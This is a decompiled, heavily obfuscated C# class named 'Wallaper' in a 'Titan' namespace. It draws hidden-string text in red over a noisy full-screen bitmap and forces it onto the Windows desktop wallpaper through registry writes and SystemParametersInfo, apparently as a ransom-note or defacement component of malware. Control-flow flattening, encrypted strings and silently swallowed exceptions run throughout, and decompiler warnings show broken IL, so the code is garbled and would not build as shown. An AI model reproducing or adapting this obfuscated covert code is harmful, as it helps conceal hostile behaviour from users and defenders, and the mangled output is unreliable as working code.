using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;

namespace Titan.Function;

internal class Wallaper
{
	private enum DeviceCap
	{
		Desktopvertres = 117,
		Desktophorzres
	}

	private enum Style
	{
		Tiled,
		Centered,
		Stretched
	}

	private const uint SPI_SETDESKWALLPAPER = 20u;

	private const uint SPIF_UPDATEINIFILE = 1u;

	private const uint SPIF_SENDWININICHANGE = 2u;

	[DllImport("gdi32.dll")]
	private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

	private static Size GetPhysicalDisplaySize()
	{
		Size result = default(Size);
		try
		{
			IntPtr hdc = _003CModule_003E._000AAõÊ_00AE(_003CModule_003E.Û_008FjR_003B(IntPtr.Zero));
			while (true)
			{
				int num = -1811737149;
				while (true)
				{
					int num2;
					switch ((uint)(num2 = _003CModule_003E._4bb1b2e5(num)) % 3u)
					{
					case 0u:
						break;
					case 2u:
						goto IL_003b;
					default:
						return result;
					case 1u:
						return result;
					}
					break;
					IL_003b:
					result = new Size(GetDeviceCaps(hdc, 118), GetDeviceCaps(hdc, 117));
					num = (num2 * 221382833) ^ 0x42CEC03E;
				}
			}
		}
		catch
		{
			while (true)
			{
				int num3 = -234095928;
				while (true)
				{
					int num2;
					switch ((uint)(num2 = _003CModule_003E._4bb1b2e5(num3)) % 3u)
					{
					case 0u:
						break;
					case 1u:
						goto IL_0084;
					default:
						return result;
					case 2u:
						return result;
					}
					break;
					IL_0084:
					result = new Size(1280, 980);
					num3 = (num2 * -369056631) ^ -1254501684;
				}
			}
		}
	}

	private static Image TextToImage(string Text, Color Brush, int fontSize)
	{
		//IL_022f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0255: Expected O, but got Unknown
		//IL_035c: Expected O, but got I4
		//IL_0399: Expected O, but got I4
		//IL_03d6: Expected O, but got I4
		//IL_0489: Unknown result type (might be due to invalid IL or missing references)
		//IL_0490: Expected O, but got Unknown
		//IL_050f: Expected O, but got I4
		//IL_0511: Unknown result type (might be due to invalid IL or missing references)
		//IL_0518: Expected O, but got Unknown
		//IL_05d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d7: Expected O, but got Unknown
		try
		{
			Size physicalDisplaySize = GetPhysicalDisplaySize();
			int num3 = default(int);
			int num5 = default(int);
			string[] array = default(string[]);
			string text = default(string);
			Graphics val5 = default(Graphics);
			Font val3 = default(Font);
			Brush val4 = default(Brush);
			PointF pointF = default(PointF);
			SizeF sizeF = default(SizeF);
			Image val = default(Image);
			int num7 = default(int);
			Bitmap val2 = default(Bitmap);
			int alpha = default(int);
			Random random = default(Random);
			int minValue = default(int);
			int maxValue = default(int);
			int red = default(int);
			int green = default(int);
			int num6 = default(int);
			int width = default(int);
			int blue = default(int);
			int height = default(int);
			Image result = default(Image);
			while (true)
			{
				int num = -1731834070;
				while (true)
				{
					int num2;
					switch ((uint)(num2 = _003CModule_003E._4bb1b2e5(num)) % 41u)
					{
					case 9u:
						break;
					case 11u:
						num3++;
						num = (num2 * 1785303507) ^ -580287758;
						continue;
					case 2u:
					{
						int num9;
						if (num5 >= array.Length)
						{
							num = -1803169313;
							num9 = num;
						}
						else
						{
							num = -1075711313;
							num9 = num;
						}
						continue;
					}
					case 14u:
						num5++;
						num = (num2 * 644882221) ^ 0x6AE8BDAF;
						continue;
					case 22u:
						text = array[num5];
						num = -471695843;
						continue;
					case 40u:
						num = (num2 * 1142197188) ^ 0x1A272D7A;
						continue;
					case 13u:
						val5.DrawString(text, val3, val4, pointF);
						num = (num2 * -1841052034) ^ -1890891283;
						continue;
					case 24u:
						num = (num2 * -412794111) ^ -1173185667;
						continue;
					case 27u:
						sizeF = val5.MeasureString(text, val3);
						num = (num2 * -204606857) ^ 0x7076047D;
						continue;
					case 23u:
						pointF = default(PointF);
						num = (num2 * 391385718) ^ 0x6EE8605F;
						continue;
					case 18u:
						val5 = Graphics.FromImage(val);
						num = (num2 * -1481884201) ^ 0x543EF23B;
						continue;
					case 20u:
						num7++;
						num = (num2 * -1957945858) ^ -2141056517;
						continue;
					case 33u:
						val = (Image)(object)val2;
						num = (num2 * -2063585205) ^ 0x339C89F8;
						continue;
					case 31u:
						_ = physicalDisplaySize.Width;
						num = (num2 * -467237377) ^ -1335497617;
						continue;
					case 12u:
						alpha = random.Next(minValue, maxValue);
						num = (num2 * 253564818) ^ 0x15917E75;
						continue;
					case 32u:
						val5.FillRectangle((Brush)new SolidBrush(Brush), pointF.X, pointF.Y, sizeF.Width, sizeF.Height);
						num = (num2 * 1251103232) ^ -1233663723;
						continue;
					case 17u:
						red = random.Next(minValue, maxValue);
						num = (num2 * -1886960379) ^ -1308547363;
						continue;
					case 5u:
						num = (num2 * -2058763722) ^ 0x6E0CF1B;
						continue;
					case 39u:
						num7 = 0;
						num = -1709041187;
						continue;
					case 30u:
						green = random.Next(minValue, maxValue);
						num = (num2 * -121493924) ^ 0x10BC7B84;
						continue;
					case 4u:
						num6 += physicalDisplaySize.Height / 22;
						num = (num2 * 975358522) ^ 0x27D3B284;
						continue;
					case 15u:
						num3 = 0;
						num = (num2 * -2082588308) ^ -391871834;
						continue;
					case 1u:
					{
						int num8;
						if (num7 < width)
						{
							num = 1786062722;
							num8 = num;
						}
						else
						{
							num = 1749254861;
							num8 = num;
						}
						continue;
					}
					case 29u:
					{
						string[] array2 = Text.Split(new string[3]
						{
							_003CModule_003E._6931997e<string>((uint)(_003CModule_003E.a200837b("Njc0ODQ3MzU=") + 3905562 - Math.Min(3905562, 7811124)), 0 + int.Parse("69956807")),
							_003CModule_003E._49b74782<string>((uint)(_003CModule_003E.a200837b("Mjk1ODczMTY2") + 3905562 - Math.Max(3905562, 1952781)), 0 + int.Parse("1372225940")),
							_003CModule_003E._31ec1b2a<string>((uint)(_003CModule_003E.a200837b("MTUxNzM5OTk4Ng==") + 3905562 - Math.Max(3905562, 1952781)), 0 + int.Parse("328729489"))
						}, StringSplitOptions.None);
						num6 = physicalDisplaySize.Height / 17;
						new List<Thread>();
						array = array2;
						num = (num2 * -908509063) ^ -262591477;
						continue;
					}
					case 25u:
						maxValue = 50;
						num = (num2 * -102399416) ^ -813203628;
						continue;
					case 0u:
						num5 = 0;
						num = (num2 * 1498265127) ^ 0x14A31168;
						continue;
					case 7u:
						val2.SetPixel(num7, num3, Color.FromArgb(alpha, red, green, blue));
						num = (num2 * 1125904515) ^ -882403771;
						continue;
					case 10u:
						minValue = 45;
						num = -520588121;
						continue;
					case 3u:
						_ = physicalDisplaySize.Height;
						num = (num2 * -2069931136) ^ -1267632015;
						continue;
					case 36u:
						val4 = (Brush)new SolidBrush(Color.Red);
						num = (num2 * 1015337674) ^ 0x21E1BE2B;
						continue;
					case 16u:
						pointF = new PointF(physicalDisplaySize.Height / 2 + physicalDisplaySize.Width / 50, num6);
						num = (num2 * -1014915343) ^ -2047608689;
						continue;
					case 8u:
						val3 = new Font(_003CModule_003E._6931997e<string>((uint)(_003CModule_003E.a200837b("OTc0NTYwNDM3") + 3905562 - Math.Max(3905562, 1952781)), 0 + int.Parse("1888735383")), (float)fontSize);
						num = (num2 * 1963961517) ^ 0x3FB3BE5B;
						continue;
					case 28u:
					{
						int num4;
						if (num3 >= height)
						{
							num = -846260599;
							num4 = num;
						}
						else
						{
							num = 1105431185;
							num4 = num;
						}
						continue;
					}
					case 6u:
						new RectangleF(pointF.X, pointF.Y, sizeF.Width, sizeF.Height);
						num = (num2 * -2134422097) ^ 0x7D534C3;
						continue;
					case 19u:
						blue = random.Next(minValue, maxValue);
						num = (num2 * 1255701633) ^ 0x7249C4B0;
						continue;
					case 37u:
						height = physicalDisplaySize.Height;
						num = (num2 * -889615964) ^ 0x77998C48;
						continue;
					case 38u:
						width = physicalDisplaySize.Width;
						num = (num2 * -657722405) ^ -478798476;
						continue;
					case 34u:
						val2 = new Bitmap(width, height);
						num = (num2 * -768926467) ^ 0x2D328E68;
						continue;
					case 35u:
						random = new Random();
						num = (num2 * 1941284167) ^ 0x3C9DA211;
						continue;
					case 21u:
						result = val;
						num = (num2 * 1104200932) ^ 0x51DF86E7;
						continue;
					default:
						return result;
					case 26u:
						return result;
					}
					break;
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
		return null;
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint uAction, uint uParam, string lpvParam, uint fuWinIni);

	private static void SetWallpaper(Image Image, Style style)
	{
		//IL_0044: Expected O, but got I4
		//IL_00e4: Expected O, but got I4
		//IL_0134: Expected O, but got I4
		//IL_016e: Expected O, but got I4
		//IL_01c5: Expected O, but got I4
		//IL_01ff: Expected O, but got I4
		//IL_0260: Expected O, but got I4
		//IL_029a: Expected O, but got I4
		//IL_032b: Expected O, but got I4
		//IL_0365: Expected O, but got I4
		//IL_03b4: Expected O, but got I4
		//IL_03ee: Expected O, but got I4
		//IL_0486: Expected O, but got I4
		//IL_04c0: Expected O, but got I4
		try
		{
			RegistryKey registryKey = _003CModule_003E.g_000D_00A0Êù(Registry.CurrentUser, _003CModule_003E._0aa39330<string>((uint)(_003CModule_003E.a200837b("LTE0NzI0MjMyNDA=") + 4286209 - Math.Min(4286209, 8572418)), 0 + int.Parse("1580474917")), true);
			string text = default(string);
			while (true)
			{
				int num = -1775307832;
				while (true)
				{
					int num2;
					switch ((uint)(num2 = _003CModule_003E._4bb1b2e5(num)) % 15u)
					{
					case 10u:
						break;
					default:
						return;
					case 3u:
						text = _003CModule_003E.MÔ_003D_009A_00A5(_5eb8f965._1fc32918(), _003CModule_003E._0aa39330<string>((uint)(_003CModule_003E.a200837b("LTE0NzI0MjMyNjM=") + 4286209 - Math.Max(4286209, 2143104)), 0 + int.Parse("945853183")));
						num = 357499309;
						continue;
					case 5u:
						_003CModule_003E.PËg_0001_000F(registryKey, _003CModule_003E._9e15c4c7<string>((uint)(_003CModule_003E.a200837b("LTEwOTQxMTM5MA==") + 4286209 - Math.Max(4286209, 2143104)), 0 + int.Parse("1336066314")), _003CModule_003E._31ec1b2a<string>((uint)(_003CModule_003E.a200837b("LTUxNTg0NjM0") + 4286209 - Math.Max(4286209, 2143104)), 0 + int.Parse("274100046")));
						num = (num2 * 644860123) ^ -249405439;
						continue;
					case 7u:
						_003CModule_003E.PËg_0001_000F(registryKey, _003CModule_003E._6931997e<string>((uint)(_003CModule_003E.a200837b("MjAyOTc4MzgwMw==") + 4286209 - Math.Max(4286209, 2143104)), 0 + int.Parse("362504636")), _003CModule_003E._6931997e<string>((uint)(_003CModule_003E.a200837b("NDA5OTExODM4") + Math.Min(4286209, 8572418) - 4286209), 0 + int.Parse("1313384395")));
						num = 1112272924;
						continue;
					case 8u:
						num = (num2 * 397781349) ^ -52941769;
						continue;
					case 2u:
						_003CModule_003E.PËg_0001_000F(registryKey, _003CModule_003E._31ec1b2a<string>((uint)(_003CModule_003E.a200837b("MjA1MjQ1MDkyMQ==") + 4286209 - Math.Max(4286209, 2143104)), 0 + int.Parse("1992037842")), _003CModule_003E._31ec1b2a<string>((uint)(_003CModule_003E.a200837b("LTUxNTg0NjM0") + 4286209 - Math.Max(4286209, 2143104)), 0 + int.Parse("391907542")));
						num = (num2 * 971707715) ^ -598077678;
						continue;
					case 6u:
						num = (num2 * 1419441361) ^ -721786442;
						continue;
					case 0u:
						_003CModule_003E.º_0081Pk9(Image, text, _003CModule_003E._000DË_0023ÿ_0087());
						num = (num2 * 1272150277) ^ -1348618177;
						continue;
					case 9u:
						goto IL_02eb;
					case 11u:
						_003CModule_003E.PËg_0001_000F(registryKey, _003CModule_003E._31ec1b2a<string>((uint)(_003CModule_003E.a200837b("MjA1MjQ1MDkyMQ==") + 4286209 - Math.Min(4286209, 8572418)), 0 + int.Parse("61769526")), _003CModule_003E._9e15c4c7<string>((uint)(_003CModule_003E.a200837b("LTEwOTQxMTM4OA==") + 4286209 - Math.Min(4286209, 8572418)), 0 + int.Parse("466804328")));
						num = (num2 * -1388159244) ^ 0x704168DA;
						continue;
					case 12u:
						SystemParametersInfo(20u, 0u, text, 3u);
						num = (num2 * -1045160256) ^ -1271822194;
						continue;
					case 1u:
						switch (style)
						{
						case Style.Tiled:
							break;
						case Style.Stretched:
							goto IL_02eb;
						default:
							goto IL_0434;
						case Style.Centered:
							goto IL_0446;
						}
						goto case 7u;
					case 14u:
						goto IL_0446;
					case 13u:
						num = (num2 * 1541075860) ^ 0x2A77E193;
						continue;
					case 4u:
						return;
						IL_0446:
						_003CModule_003E.PËg_0001_000F(registryKey, _003CModule_003E._31ec1b2a<string>((uint)(_003CModule_003E.a200837b("NzAzMTMzNDAy") + 4286209 - Math.Min(4286209, 8572418)), 0 + int.Parse("587075745")), _003CModule_003E._9e15c4c7<string>((uint)(_003CModule_003E.a200837b("LTEwOTQxMTM4OA==") + 4286209 - Math.Max(4286209, 2143104)), 0 + int.Parse("767467910")));
						num = 339622345;
						continue;
						IL_0434:
						num = (num2 * 1685629197) ^ -1116335099;
						continue;
						IL_02eb:
						_003CModule_003E.PËg_0001_000F(registryKey, _003CModule_003E._9e15c4c7<string>((uint)(_003CModule_003E.a200837b("LTEwOTQxMTM2Nw==") + 4286209 - Math.Max(4286209, 2143104)), 0 + int.Parse("122783103")), _003CModule_003E._49b74782<string>((uint)(_003CModule_003E.a200837b("Mjk1ODczODE4") + Math.Min(4286209, 8572418) - 4286209), 0 + int.Parse("143251397")));
						num = -2011845242;
						continue;
					}
					break;
				}
			}
		}
		catch
		{
		}
	}

	public static void Set(string text)
	{
		SetWallpaper(TextToImage(text, _003CModule_003E.Æí_00A0ÑE(), 19), Style.Centered);
	}
}
